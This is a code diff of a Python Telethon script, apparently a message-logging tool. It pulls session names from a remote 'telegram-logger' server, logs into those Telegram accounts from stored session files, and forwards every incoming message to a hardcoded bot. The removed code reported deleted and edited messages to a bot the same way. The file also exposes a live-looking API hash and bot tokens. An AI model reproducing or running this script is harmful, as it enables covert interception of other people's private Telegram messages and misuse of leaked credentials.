@@ -1,63 +1,103 @@
 import asyncio
-import requests
+import aiohttp
 from telethon import TelegramClient, events
+import os
 
-API_ID = 30074866  # ← вставь свой
-API_HASH = "eea91e3c3b0381b36d455383fe5b9989"  # ← вставь свой
+# 🔐 ТВОИ ДАННЫЕ
+API_ID = 30074866
+API_HASH = "eea91e3c3b0381b36d455383fe5b9989"
+BOT_TOKEN = "7649175732:AAEiyZNWIgEdgx3i4f4Bsik_9p9JgEZayS4"
 
-BOT_TOKEN = "8695827916:AAENIQTjiIaorme2RJwdppGLn1_85rjXzkY"
-CHAT_ID = "7649175732"
-
+# 🌐 СЕРВЕР (ОБЯЗАТЕЛЬНО https)
 SERVER_URL = "https://telegram-logger-production-2ca8.up.railway.app"
 
-clients = {}
+# 📁 папка для сессий
+SESSIONS_DIR = "sessions"
 
-def send(text):
+# создаём папку если нет
+os.makedirs(SESSIONS_DIR, exist_ok=True)
+
+
+# 📥 получаем список сессий с сервера
+async def fetch_sessions():
     try:
-        requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            data={"chat_id": CHAT_ID, "text": text}
-        )
-    except:
-        pass
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"{SERVER_URL}/sessions") as resp:
+                data = await resp.json()  # ✅ фикс ошибки string indices
+
+                # поддержка разных форматов
+                if isinstance(data, dict):
+                    return data.get("sessions", [])
+                elif isinstance(data, list):
+                    return data
+                else:
+                    return []
+
+    except Exception as e:
+        print("ERR fetch_sessions:", e)
+        return []
 
 
-async def start_client(name, session):
-    client = TelegramClient(session, API_ID, API_HASH)
+# 📤 отправка сообщения боту
+async def send_to_bot(text):
+    try:
+        async with aiohttp.ClientSession() as session:
+            await session.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                data={
+                    "chat_id": BOT_TOKEN.split(":")[0],  # 👈 отправка самому себе
+                    "text": text[:4000]
+                }
+            )
+    except Exception as e:
+        print("ERR send_to_bot:", e)
+
+
+# 🚀 запуск клиента
+async def run_client(session_name):
+    path = os.path.join(SESSIONS_DIR, session_name)
+
+    client = TelegramClient(path, API_ID, API_HASH)
+
+    @client.on(events.NewMessage)
+    async def handler(event):
+        try:
+            msg = event.message.text or ""
+
+            text = f"""
+📩 NEW MESSAGE
+👤 ID: {event.sender_id}
+💬 Chat: {event.chat_id}
+
+{msg}
+"""
+            await send_to_bot(text)
+
+        except Exception as e:
+            print("ERR handler:", e)
+
     await client.start()
-
-    print("✅", name)
-
-    @client.on(events.MessageDeleted)
-    async def deleted(event):
-        send(f"🗑 Удалено | {name} | chat {event.chat_id}")
-
-    @client.on(events.MessageEdited)
-    async def edited(event):
-        send(f"✏️ Изменено | {name} | {event.text}")
-
+    print(f"✅ Started: {session_name}")
     await client.run_until_disconnected()
 
 
+# 🧠 главный цикл
 async def main():
     print("🚀 START")
 
-    while True:
-        try:
-            data = requests.get(f"{SERVER_URL}/sessions").json()
+    sessions = await fetch_sessions()
+    print("sessions:", sessions)
 
-            for acc in data:
-                if acc["name"] in clients:
-                    continue
+    if not sessions:
+        print("❌ No sessions found")
+        return
 
-                clients[acc["name"]] = asyncio.create_task(
-                    start_client(acc["name"], acc["session"])
-                )
+    tasks = []
+    for s in sessions:
+        tasks.append(asyncio.create_task(run_client(s)))
 
-        except Exception as e:
-            print("ERR:", e)
-
-        await asyncio.sleep(10)
+    await asyncio.gather(*tasks)
 
 
-asyncio.run(main())
+if __name__ == "__main__":
+    asyncio.run(main())
